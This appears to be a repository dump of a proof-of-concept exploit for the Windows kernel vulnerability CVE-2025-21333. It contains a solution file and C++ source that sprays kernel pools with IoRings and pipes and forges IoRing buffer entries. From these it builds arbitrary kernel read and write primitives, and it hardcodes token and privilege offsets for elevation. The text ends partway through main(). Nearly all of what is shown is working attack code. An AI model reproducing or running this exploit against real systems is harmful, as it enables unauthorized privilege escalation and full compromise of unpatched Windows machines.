Project Path: arc_gmh5225_CVE-2025-21333-POC__tpug6mj

Source Tree:

```txt
arc_gmh5225_CVE-2025-21333-POC__tpug6mj
├── CVE-2025-21333-POC
│   ├── CVE-2025-21333-POC.cpp
│   ├── CVE-2025-21333-POC.vcxproj
│   ├── CVE-2025-21333-POC.vcxproj.filters
│   ├── Hexdump.hpp
│   └── wnf.h
├── CVE-2025-21333-POC.sln
└── README.md

```

`CVE-2025-21333-POC.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.11.35303.130
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "CVE-2025-21333-POC", "CVE-2025-21333-POC\CVE-2025-21333-POC.vcxproj", "{5592EAEA-F200-4FD7-BB63-12B9B6F72DA3}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{5592EAEA-F200-4FD7-BB63-12B9B6F72DA3}.Debug|x64.ActiveCfg = Debug|x64
		{5592EAEA-F200-4FD7-BB63-12B9B6F72DA3}.Debug|x64.Build.0 = Debug|x64
		{5592EAEA-F200-4FD7-BB63-12B9B6F72DA3}.Debug|x86.ActiveCfg = Debug|Win32
		{5592EAEA-F200-4FD7-BB63-12B9B6F72DA3}.Debug|x86.Build.0 = Debug|Win32
		{5592EAEA-F200-4FD7-BB63-12B9B6F72DA3}.Release|x64.ActiveCfg = Release|x64
		{5592EAEA-F200-4FD7-BB63-12B9B6F72DA3}.Release|x64.Build.0 = Release|x64
		{5592EAEA-F200-4FD7-BB63-12B9B6F72DA3}.Release|x86.ActiveCfg = Release|Win32
		{5592EAEA-F200-4FD7-BB63-12B9B6F72DA3}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {851FB1DD-316F-4DD0-BCF8-5334DD4A664F}
	EndGlobalSection
EndGlobal

```

`CVE-2025-21333-POC/CVE-2025-21333-POC.cpp`:

```cpp
// poc.cpp : Questo file contiene la funzione 'main', in cui inizia e termina l'esecuzione del programma.
//

#include <iostream>
#include <Windows.h>
#include <combaseapi.h>
#include <iostream>
#include <sstream>
#include "Hexdump.hpp"
#include <ioringapi.h>
#include <tlhelp32.h>
#include <DbgEng.h>
#include <aclapi.h>
#include "wnf.h"
#include <vector>
#include <algorithm>
#include <tuple>

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "Rpcrt4.lib")

#define STATENAMES1_SIZE 0x2000
#define IORINGS_SIZE 0x500
#define SPRAY_PIPE_COUNT 0x500
#define STATENAMES2_SIZE 0x2000
#define STATENAMES3_SIZE 0x800
#define EPROCESS_UNIQUEPROCESSID_OFFSET 0x440
#define EPROCESS_FLINK_OFFSET 0x448
#define EPROCESS_TOKEN_OFFSET 0x4b8
#define SEP_TOKEN_PRIVILEGES_OFFSET 0x40
#define INTEGRITYLEVELINDEX_OFFSET 0xd0
#define NPFS_NPFSDCREATE_OFFSET 0xcfc0
#define NPFS_GOT_ALLOCATEPOOL2_OFFSET 0x7050
#define NT_ALLOCATEPOOL2_OFFSET 0xaaa3b0
#define NT_INITIALSYSTEMPROCESS_OFFSET 0xd1ea60
#define ROOT_PIPE_ATTRIBUTE_OFFSET      0x140
#define FILE_OBJECT_OFFSET              0x30
#define OBJECT_HEADER_SIZE 0x30
#define TARGET_SIZE 0x50
#define REGBUFFERCOUNT (TARGET_SIZE-0x10)/sizeof(PVOID)
#define OBJECT_HEADER_NAMEINFO_SIZE 0x20
#define REGBUFFERS_TAG 0x42527249
#define PIPEATTRIBUTE_TAG 0x7441704e
#define OUTPUT_PIPE_NAME L"\\\\.\\pipe\\IoRingExploitOutput"
#define INPUT_PIPE_NAME L"\\\\.\\pipe\\IoRingExploitInput"
#define WNF_MAX_DATA_SIZE 0x1000
#define ROUND_DOWN(n, align) (((ULONG)n) & ~((align) - 1l))
#define ROUND_UP(n, align) ROUND_DOWN(((ULONG)n) + (align) - 1, (align))

#define InitializeObjectAttributes( p, n, a, r, s ) { \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
    }

/* Documented in "Windows NT/2000 Native API Reference" by Gary Nebbett. */
typedef struct _SYSTEM_PERFORMANCE_INFORMATION {
    LARGE_INTEGER IdleTime;
    LARGE_INTEGER ReadTransferCount;
    LARGE_INTEGER WriteTransferCount;
    LARGE_INTEGER OtherTransferCount;
    ULONG ReadOperationCount;
    ULONG WriteOperationCount;
    ULONG OtherOperationCount;
    ULONG AvailablePages;
    ULONG TotalCommittedPages;
    ULONG TotalCommitLimit;
    ULONG PeakCommitment;
    ULONG PageFaults;
    ULONG WriteCopyFaults;
    ULONG TransitionFaults;
    ULONG Reserved1;
    ULONG DemandZeroFaults;
    ULONG PagesRead;
    ULONG PageReadIos;
    ULONG Reserved2[2];
    ULONG PagefilePagesWritten;
    ULONG PagefilePageWriteIos;
    ULONG MappedFilePagesWritten;
    ULONG MappedFilePageWriteIos;
    ULONG PagedPoolUsage;
    ULONG NonPagedPoolUsage;
    ULONG PagedPoolAllocs;
    ULONG PagedPoolFrees;
    ULONG NonPagedPoolAllocs;
    ULONG NonPagedPoolFrees;
    ULONG TotalFreeSystemPtes;
    ULONG SystemCodePage;
    ULONG TotalSystemDriverPages;
    ULONG TotalSystemCodePages;
    ULONG SmallNonPagedLookasideListAllocateHits;
    ULONG SmallPagedLookasideListAllocateHits;
    ULONG Reserved3;
    ULONG MmSystemCachePage;
    ULONG PagedPoolPage;
    ULONG SystemDriverPage;
    ULONG FastReadNoWait;
    ULONG FastReadWait;
    ULONG FastReadResourceMiss;
    ULONG FastReadNotPossible;
    ULONG FastMdlReadNoWait;
    ULONG FastMdlReadWait;
    ULONG FastMdlReadResourceMiss;
    ULONG FastMdlReadNotPossible;
    ULONG MapDataNoWait;
    ULONG MapDataWait;
    ULONG MapDataNoWaitMiss;
    ULONG MapDataWaitMiss;
    ULONG PinMappedDataCount;
    ULONG PinReadNoWait;
    ULONG PinReadWait;
    ULONG PinReadNoWaitMiss;
    ULONG PinReadWaitMiss;
    ULONG CopyReadNoWait;
    ULONG CopyReadWait;
    ULONG CopyReadNoWaitMiss;
    ULONG CopyReadWaitMiss;
    ULONG MdlReadNoWait;
    ULONG MdlReadWait;
    ULONG MdlReadNoWaitMiss;
    ULONG MdlReadWaitMiss;
    ULONG ReadAheadIos;
    ULONG LazyWriteIos;
    ULONG LazyWritePages;
    ULONG DataFlushes;
    ULONG DataPages;
    ULONG ContextSwitches;
    ULONG FirstLevelTbFills;
    ULONG SecondLevelTbFills;
    ULONG SystemCalls;
} SYSTEM_PERFORMANCE_INFORMATION, * PSYSTEM_PERFORMANCE_INFORMATION;
typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemBasicInformation = 0,
    SystemPerformanceInformation = 2,
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(WINAPI* NtQuerySystemInformation_t)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );




typedef enum _PROCESSINFOCLASS {
    ProcessBasicInformation = 0,
    ProcessQuotaLimits = 1,
    ProcessIoCounters = 2,
    ProcessVmCounters = 3,
    ProcessTimes = 4,
    ProcessBasePriority = 5,
    ProcessRaisePriority = 6,
    ProcessDebugPort = 7,
    ProcessExceptionPort = 8,
    ProcessAccessToken = 9,
    ProcessLdtInformation = 10,
    ProcessLdtSize = 11,
    ProcessDefaultHardErrorMode = 12,
    ProcessIoPortHandlers = 13,
    ProcessPooledUsageAndLimits = 14,
    ProcessWorkingSetWatch = 15,
    ProcessUserModeIOPL = 16,
    ProcessEnableAlignmentFaultFixup = 17,
    ProcessPriorityClass = 18,
    ProcessWx86Information = 19,
    ProcessHandleCount = 20,
    ProcessAffinityMask = 21,
    ProcessPriorityBoost = 22,
    ProcessDeviceMap = 23,
    ProcessSessionInformation = 24,
    ProcessForegroundInformation = 25,
    ProcessWow64Information = 26,
    ProcessImageFileName = 27,
    ProcessLUIDDeviceMapsEnabled = 28,
    ProcessBreakOnTermination = 29,
    ProcessDebugObjectHandle = 30,
    ProcessDebugFlags = 31,
    ProcessHandleTracing = 32,
    ProcessIoPriority = 33,
    ProcessExecuteFlags = 34,
    ProcessTlsInformation = 35,
    ProcessCookie = 36,
    ProcessImageInformation = 37,
    ProcessCycleTime = 38,
    ProcessPagePriority = 39,
    ProcessInstrumentationCallback = 40,
    ProcessThreadStackAllocation = 41,
    ProcessWorkingSetWatchEx = 42,
    ProcessImageFileNameWin32 = 43,
    ProcessImageFileMapping = 44,
    ProcessAffinityUpdateMode = 45,
    ProcessMemoryAllocationMode = 46,
    ProcessGroupInformation = 47,
    ProcessTokenVirtualizationEnabled = 48,
    ProcessConsoleHostProcess = 49,
    ProcessWindowInformation = 50,
    ProcessHandleInformation = 51,
    ProcessMitigationPolicy = 52,
    ProcessDynamicFunctionTableInformation = 53,
    ProcessHandleCheckingMode = 54,
    ProcessKeepAliveCount = 55,
    ProcessRevokeFileHandles = 56,
    ProcessWorkingSetControl = 57,
    ProcessHandleTable = 58,
    ProcessCheckStackExtentsMode = 59,
    ProcessCommandLineInformation = 60,
    ProcessProtectionInformation = 61,
    ProcessMemoryExhaustion = 62,
    ProcessFaultInformation = 63,
    ProcessTelemetryIdInformation = 64,
    ProcessCommitReleaseInformation = 65,
    ProcessDefaultCpuSetsInformation = 66,
    ProcessAllowedCpuSetsInformation = 67,
    ProcessSubsystemProcess = 68,
    ProcessJobMemoryInformation = 69,
    ProcessInPrivate = 70,
    ProcessRaiseUMExceptionOnInvalidHandleClose = 71,
    ProcessIumChallengeResponse = 72,
    ProcessChildProcessInformation = 73,
    ProcessHighGraphicsPriorityInformation = 74,
    ProcessSubsystemInformation = 75,
    ProcessEnergyValues = 76,
    ProcessPowerThrottlingState = 77,
    ProcessReserved3Information = 78,
    ProcessWin32kSyscallFilterInformation = 79,
    ProcessDisableSystemAllowedCpuSets = 80,
    ProcessWakeInformation = 81,
    ProcessEnergyTrackingState = 82,
    ProcessManageWritesToExecutableMemory = 83,
    ProcessCaptureTrustletLiveDump = 84,
    ProcessTelemetryCoverage = 85,
    ProcessEnclaveInformation = 86,
    ProcessEnableReadWriteVmLogging = 87,
    ProcessUptimeInformation = 88,
    ProcessImageSection = 89,
    ProcessDebugAuthInformation = 90,
    ProcessSystemResourceManagement = 91,
    ProcessSequenceNumber = 92,
    ProcessLoaderDetour = 93,
    ProcessSecurityDomainInformation = 94,
    ProcessCombineSecurityDomainsInformation = 95,
    ProcessEnableLogging = 96,
    ProcessLeapSecondInformation = 97,
    ProcessFiberShadowStackAllocation = 98,
    ProcessFreeFiberShadowStackAllocation = 99,
    ProcessAltSystemCallInformation = 100,
    ProcessDynamicEHContinuationTargets = 101,
    ProcessDynamicEnforcedCetCompatibleRanges = 102,
    ProcessCreateStateChange = 103,
    ProcessApplyStateChange = 104,
    ProcessEnableOptionalXStateFeatures = 105,
    ProcessAltPrefetchParam = 106,
    ProcessAssignCpuPartitions = 107,
    ProcessPriorityClassEx = 108,
    ProcessMembershipInformation = 109,
} PROCESSINFOCLASS;

typedef struct _SEP_TOKEN_PRIVILEGES
{
    ULONGLONG Present;                                                      //0x0
    ULONGLONG Enabled;                                                      //0x8
    ULONGLONG EnabledByDefault;                                             //0x10
}SEP_TOKEN_PRIVILEGES, * PSEP_TOKEN_PRIVILEGES;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

#define SystemHandleInformation 0x10
#define SystemHandleInformationSize 1024 * 1024 * 2

using fNtQuerySystemInformation = NTSTATUS(WINAPI*)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

using myNtFsControlFile = NTSTATUS(WINAPI*)(
    IN HANDLE               FileHandle,
    IN HANDLE               Event OPTIONAL,
    IN PVOID      ApcRoutine OPTIONAL,
    IN PVOID                ApcContext OPTIONAL,
    OUT PVOID    IoStatusBlock,
    IN ULONG                FsControlCode,
    IN PVOID                InputBuffer OPTIONAL,
    IN ULONG                InputBufferLength,
    OUT PVOID               OutputBuffer OPTIONAL,
    IN ULONG                OutputBufferLength);

// handle information
typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

// handle table information
typedef struct _SYSTEM_HANDLE_INFORMATION
{
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PSECURITY_DESCRIPTOR           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
    BYTE           Reserved1[16];
    PVOID          Reserved2[10];
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB {
    BYTE                          Reserved1[2];
    BYTE                          BeingDebugged;
    BYTE                          Reserved2[1];
    PVOID                         Reserved3[2];
    PVOID                         Ldr;
    PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
    PVOID                         Reserved4[3];
    PVOID                         AtlThunkSListPtr;
    PVOID                         Reserved5;
    ULONG                         Reserved6;
    PVOID                         Reserved7;
    ULONG                         Reserved8;
    ULONG                         AtlThunkSListPtr32;
    PVOID                         Reserved9[45];
    BYTE                          Reserved10[96];
    PVOID PostProcessInitRoutine;
    BYTE                          Reserved11[128];
    PVOID                         Reserved12[1];
    ULONG                         SessionId;
} PEB, * PPEB;

typedef LONG       KPRIORITY;

typedef struct _POOL_HEADER
{
    union
    {
        struct
        {
            USHORT PreviousSize : 8;                                          //0x0
            USHORT PoolIndex : 8;                                             //0x0
            USHORT BlockSize : 8;                                             //0x2
            USHORT PoolType : 8;                                              //0x2
        };
        ULONG Ulong1;                                                       //0x0
    };
    ULONG PoolTag;                                                          //0x4
    union
    {
        PVOID ProcessBilled;                                    //0x8
        struct
        {
            USHORT AllocatorBackTraceIndex;                                 //0x8
            USHORT PoolTagHash;                                             //0xa
        };
    };
}POOL_HEADER, * PPOOL_HEADER;

//0x8 bytes (sizeof)
struct _NT_IORING_CREATE_FLAGS
{
    enum _NT_IORING_CREATE_REQUIRED_FLAGS Required;                         //0x0
    enum _NT_IORING_CREATE_ADVISORY_FLAGS Advisory;                         //0x4
};

//0x30 bytes (sizeof)
typedef struct _NT_IORING_INFO
{
    enum IORING_VERSION IoRingVersion;                                      //0x0
    struct _NT_IORING_CREATE_FLAGS Flags;                                   //0x4
    ULONG SubmissionQueueSize;                                              //0xc
    ULONG SubmissionQueueRingMask;                                          //0x10
    ULONG CompletionQueueSize;                                              //0x14
    ULONG CompletionQueueRingMask;                                          //0x18
    PVOID SubmissionQueue;                    //0x20
    PVOID CompletionQueue;                    //0x28
}NT_IORING_INFO, * PNT_IORING_INFO;


typedef struct _KEVENT {
    unsigned char Header[0x18];
} KEVENT, * PKEVENT, * PRKEVENT;

//0x80 bytes (sizeof)
typedef struct _IOP_MC_BUFFER_ENTRY
{
    USHORT Type;                                                            //0x0
    USHORT Reserved;                                                        //0x2
    ULONG Size;                                                             //0x4
    LONG ReferenceCount;                                                    //0x8
    enum _IOP_MC_BUFFER_ENTRY_FLAGS Flags;                                  //0xc
    struct _LIST_ENTRY GlobalDataLink;                                      //0x10
    PVOID Address;                                                          //0x20
    ULONG Length;                                                           //0x28
    CHAR AccessMode;                                                        //0x2c
    LONG MdlRef;                                                            //0x30
    PVOID Mdl;                                                       //0x38
    struct _KEVENT MdlRundownEvent;                                         //0x40
    ULONGLONG* PfnArray;                                                    //0x58
    BYTE dummy[0x20];                               //0x60
}IOP_MC_BUFFER_ENTRY, * PIOP_MC_BUFFER_ENTRY;



typedef struct _UIORING
{
    HANDLE handle;
    NT_IORING_INFO Info;
    UINT32 IoRingKernelAcceptedVersion;
    PVOID RegBufferArray;   // Pointer to array of IORING opperations
    UINT32 BufferArraySize;  // Size of array of opperation pointers
    PVOID Unknown;
    UINT32 FileHandlesCount;
    UINT32 SubQueueHead;
    UINT32 SubQueueTail;
}UIORING, * PUIORING;

typedef struct _PROCESS_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PPEB PebBaseAddress;
    ULONG_PTR AffinityMask;
    KPRIORITY BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION;

using NtCreateCrossVmEvent = NTSTATUS(NTAPI*)(PHANDLE EventHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    ULONG Unknown1,
    PVOID Unknown2,
    IN GUID* Guid
    );

using NtQueryInformationProcess = NTSTATUS(WINAPI*)(
    HANDLE           ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID            ProcessInformation,
    ULONG            ProcessInformationLength,
    PULONG           ReturnLength
    );

HANDLE GetWinSBXCliProcHandle() {
    HANDLE hProcess = NULL;
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return NULL;
    }
    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return NULL;
    }
    do {
        if (wcscmp(pe32.szExeFile, L"WindowsSandboxClient.exe") == 0) {
            hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
            break;
        }
    } while (Process32Next(hSnapshot, &pe32));
    CloseHandle(hSnapshot);
    return hProcess;
}

using myNtUpdateWnfStateData =
NTSTATUS(
    NTAPI*)
    (
        _In_ PCWNF_STATE_NAME StateName,
        _In_reads_bytes_opt_(Length) const VOID* Buffer,
        _In_opt_ ULONG Length,
        _In_opt_ PCWNF_TYPE_ID TypeId,
        _In_opt_ const VOID* ExplicitScope,
        _In_ WNF_CHANGE_STAMP MatchingChangeStamp,
        _In_ LOGICAL CheckStamp
        );

using myNtCreateWnfStateName =
NTSTATUS(
    NTAPI*)
    (
        _Out_ PWNF_STATE_NAME StateName,
        _In_ WNF_STATE_NAME_LIFETIME NameLifetime,
        _In_ WNF_DATA_SCOPE DataScope,
        _In_ BOOLEAN PersistData,
        _In_opt_ PCWNF_TYPE_ID TypeId,
        _In_ ULONG MaximumStateSize,
        _In_ PSECURITY_DESCRIPTOR SecurityDescriptor
        );

using myNtDeleteWnfStateName =
NTSTATUS(
    NTAPI*)
    (
        _Out_ PWNF_STATE_NAME StateName
        );

using myNtQueryWnfStateData =
NTSTATUS(
    NTAPI*)(
        _In_ PCWNF_STATE_NAME StateName,
        _In_opt_ PCWNF_TYPE_ID TypeId,
        _In_opt_ const VOID* ExplicitScope,
        _Out_ PWNF_CHANGE_STAMP ChangeStamp,
        _Out_writes_bytes_to_opt_(*BufferSize, *BufferSize) PVOID Buffer,
        _Inout_ PULONG BufferSize
        );


using myNtDeleteWnfStateData =
NTSTATUS(
    NTAPI*)
    (
        _In_ PCWNF_STATE_NAME StateName,
        _In_opt_ const VOID* ExplicitScope
        );


typedef struct _WNF_STATE_CORRUPTED {
    WNF_STATE_NAME state;
    unsigned long long val;
    ULONG dataSize;
} WNF_STATE_CORRUPTED, * PWNF_STATE_CORRUPTED;

typedef struct _TEMP_ARRAY_ELEMENT {
    PISID  Sid;
    ULONG SidLength;
} TEMP_ARRAY_ELEMENT;


typedef struct _SPRAY_PIPE {
    HANDLE pipe_read;
    HANDLE pipe_write;
}SPRAY_PIPE, * PSPRAY_PIPE;

PUIORING puioring = NULL;
PVOID ioringaddress = NULL;
HIORING targetHandle = NULL;
IOP_MC_BUFFER_ENTRY* fake_bufferentry = NULL;
UINT_PTR userData = 0x41414141;
ULONG numberOfFakeBuffers = 100;
PVOID addressForFakeBuffers = NULL;
HANDLE inputPipe = INVALID_HANDLE_VALUE;
HANDLE outputPipe = INVALID_HANDLE_VALUE;
HANDLE inputClientPipe = INVALID_HANDLE_VALUE;
HANDLE outputClientPipe = INVALID_HANDLE_VALUE;
IORING_BUFFER_INFO preregBuffers[REGBUFFERCOUNT] = { 0 };
PUIORING* iorings = NULL;
SPRAY_PIPE* spray_pipes = NULL;
SIZE_T attribute_size = TARGET_SIZE - 0x38;
unsigned char* attribute = NULL;
unsigned char* output = NULL;
SIZE_T output_size = 0x100;

BOOL prepare() {
    iorings = new PUIORING[IORINGS_SIZE];
    HRESULT result;
    IORING_CREATE_FLAGS flags;
    spray_pipes = new SPRAY_PIPE[SPRAY_PIPE_COUNT];

    for (int i = 0; i < SPRAY_PIPE_COUNT; i++) {
        if (!CreatePipe(&spray_pipes[i].pipe_read, &spray_pipes[i].pipe_write, NULL, NULL)) {
            std::cout << "CreatePipe failed with error " << GetLastError() << "  index " << i << std::endl;
        }
    }

    attribute = new unsigned char[0x1000];
    memset(attribute, 0x41, 0x1000);
    attribute[0] = 'Z';
    attribute[1] = '\0';
    output = new unsigned char[output_size];
    memset(output, 0x0, 0x100);

    flags.Required = IORING_CREATE_REQUIRED_FLAGS_NONE;
    flags.Advisory = IORING_CREATE_ADVISORY_FLAGS_NONE;

    fake_bufferentry = reinterpret_cast<IOP_MC_BUFFER_ENTRY*>(VirtualAlloc(NULL, 0x5000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE));
    VirtualLock(fake_bufferentry, 0x5000);
    fake_bufferentry = reinterpret_cast<IOP_MC_BUFFER_ENTRY*>(reinterpret_cast<unsigned char*>(fake_bufferentry) + 0x3000);
    memset(fake_bufferentry, 0, sizeof(IOP_MC_BUFFER_ENTRY));
    //pre-register buffer array with len=REGBUFFERCOUNT
    preregBuffers[0].Address = VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!preregBuffers[0].Address)
    {
        printf("[-] Failed to allocate prereg buffer\n");
        return FALSE;
    }
    memset(preregBuffers[0].Address, 0x41, 0x100);
    preregBuffers[0].Length = 0x10;

    for (int i = 0; i < IORINGS_SIZE; i++) {
        result = CreateIoRing(IORING_VERSION_3, flags, 0x10000, 0x20000, reinterpret_cast<HIORING*>(&(iorings[i])));
        if (!SUCCEEDED(result))
        {
            printf("[-] Failed creating IO ring handle: 0x%x\n", result);
        }
        //printf("[+] Created IoRing. puioring=0x%p\n", iorings[i]);

        result = BuildIoRingRegisterBuffers(reinterpret_cast<HIORING>(iorings[i]), REGBUFFERCOUNT, preregBuffers, 0);
        if (!SUCCEEDED(result))
        {
            printf("[-] Failed BuildIoRingRegisterBuffers: 0x%x\n", result);
        }
    }

    // Create named pipes for the input/output of the I/O operations
    // and open client handles for them
    //
    inputPipe = CreateNamedPipe(INPUT_PIPE_NAME, PIPE_ACCESS_DUPLEX, PIPE_WAIT, 255, 0x1000, 0x1000, 0, NULL);
    if (inputPipe == INVALID_HANDLE_VALUE)
    {
        printf("[-] Failed to create input pipe: 0x%x\n", GetLastError());
        return FALSE;
    }
    outputPipe = CreateNamedPipe(OUTPUT_PIPE_NAME, PIPE_ACCESS_DUPLEX, PIPE_WAIT, 255, 0x1000, 0x1000, 0, NULL);
    if (outputPipe == INVALID_HANDLE_VALUE)
    {
        printf("[-] Failed to create output pipe: 0x%x\n", GetLastError());
        return FALSE;
    }

    outputClientPipe = CreateFile(OUTPUT_PIPE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (outputClientPipe == INVALID_HANDLE_VALUE)
    {
        printf("[-] Failed to open handle to output file: 0x%x\n", GetLastError());
        return FALSE;
    }

    inputClientPipe = CreateFile(INPUT_PIPE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (inputClientPipe == INVALID_HANDLE_VALUE)
    {
        printf("[-] Failed to open handle to input pipe: 0x%x\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

BOOL KWrite(PVOID TargetAddress, PBYTE pValue, SIZE_T size) {

    DWORD bytesWritten = 0;
    HRESULT result;
    UINT32 submittedEntries;
    IORING_CQE cqe;

    //printf("[*] Writing to %p the following bytes\n", TargetAddress);
    //printf("[*] pValue = 0x%p\n", pValue);
    //printf("[*] data: ");
    //for (int i = 0; i < size; i++) {
    //    printf("0x%x ", pValue[i]);
    //}
    //printf("\n");
    if (WriteFile(inputPipe, pValue, size, &bytesWritten, NULL) == FALSE)
    {
        result = GetLastError();
        printf("[-] Failed to write into the input pipe: 0x%x\n", result);
        return FALSE;
    }
    //printf("[*] bytesWritten = %d\n", bytesWritten);
    //
    // Setup another buffer entry, with the address of ioring->RegBuffers as the target
    // Use the client's handle of the input pipe for the read operation
    //
    memset(fake_bufferentry, 0, sizeof(IOP_MC_BUFFER_ENTRY));
    fake_bufferentry->Address = TargetAddress;
    fake_bufferentry->Length = size;
    fake_bufferentry->Type = 0xc02;
    fake_bufferentry->Size = 0x80;
    fake_bufferentry->AccessMode = 1;
    fake_bufferentry->ReferenceCount = 1;

    auto requestDataBuffer = IoRingBufferRefFromIndexAndOffset(0, 0);
    auto requestDataFile = IoRingHandleRefFromHandle(inputClientPipe);

    //printf("[*] performing buildIoRingReadFile\n");
    result = BuildIoRingReadFile(targetHandle,
        requestDataFile,
        requestDataBuffer,
        size,
        0,
        NULL,
        IOSQE_FLAGS_NONE);
    if (!SUCCEEDED(result))
    {
        printf("[-] Failed building IO ring read file structure: 0x%x\n", result);
        return FALSE;
    }

    result = SubmitIoRing(targetHandle, 1, INFINITE, &submittedEntries);
    if (!SUCCEEDED(result))
    {
        printf("[-] Failed submitting IO ring: 0x%x\n", result);
        return FALSE;
    }
    //printf("[*] submittedEntries = %d\n", submittedEntries);
    return TRUE;
}

BOOL KRead(PVOID TargetAddress, PBYTE pOut, SIZE_T size) {
    DWORD bytesRead = 0;
    HRESULT result;
    UINT32 submittedEntries;
    IORING_CQE cqe;

    memset(fake_bufferentry, 0, sizeof(IOP_MC_BUFFER_ENTRY));
    fake_bufferentry->Address = TargetAddress;
    fake_bufferentry->Length = size;
    fake_bufferentry->Type = 0xc02;
    fake_bufferentry->Size = 0x80;
    fake_bufferentry->AccessMode = 1;
    fake_bufferentry->ReferenceCount = 1;

    auto requestDataBuffer = IoRingBufferRefFromIndexAndOffset(0, 0);
    auto requestDataFile = IoRingHandleRefFromHandle(outputClientPipe);

    result = BuildIoRingWriteFile(targetHandle,
        requestDataFile,
        requestDataBuffer,
        size,
        0,
        FILE_WRITE_FLAGS_NONE,
        NULL,
        IOSQE_FLAGS_NONE);
    if (!SUCCEEDED(result))
    {
        printf("[-] Failed building IO ring read file structure: 0x%x\n", result);
        return FALSE;
    }

    result = SubmitIoRing(targetHandle, 1, INFINITE, &submittedEntries);
    if (!SUCCEEDED(result))
    {
        printf("[-] Failed submitting IO ring: 0x%x\n", result);
        return FALSE;
    }
    //printf("[*] submittedEntries = %d\n", submittedEntries);
    //
    // Check the completion queue for the actual status code for the operation
    //
    result = PopIoRingCompletion(targetHandle, &cqe);
    if ((!SUCCEEDED(result)) || (!NT_SUCCESS(cqe.ResultCode)))
    {
        printf("[-] Failed reading kernel memory 0x%x\n", cqe.ResultCode);
        return FALSE;
    }

    BOOL res = ReadFile(outputPipe,
        pOut,
        size,
        &bytesRead,
        NULL);
    if (!res)
    {
        printf("[-] Failed to read from output pipe: 0x%x\n", GetLastError());
        return FALSE;
    }
    //printf("[+] Successfully read %d bytes from kernel address 0x%p.\n", bytesRead, TargetAddress);
    return res;
}

int main()
{
    //printf("creating event\n");

    //////getchar();

    HANDLE hEvent;
    GUID guid, guid2;
    ULONG ReturnLength = 0;
    LPOLESTR guidstr = (LPOLESTR)new char[0x100];
    LPOLESTR guidstr2 = (LPOLESTR)new char[0x100];
    STARTUPINFOA si;
    unsigned char* status[0x30] = { 0 };
    PROCESS_INFORMATION pi;
    DWORD64 out = 0;
    DWORD64 fileObject = 0;
    DWORD64 driverObject = 0;
    DWORD64 deviceObject = 0;
    POOL_HEADER* ph = NULL;
    DWORD64 pNpFsdCreate = 0;
    DWORD64* data = NULL;
    unsigned char* ptr3 = NULL;
    DWORD64 pExAllocatePool2 = 0;
    DWORD64 system_eproc = 0;
    DWORD64 system_token = 0;
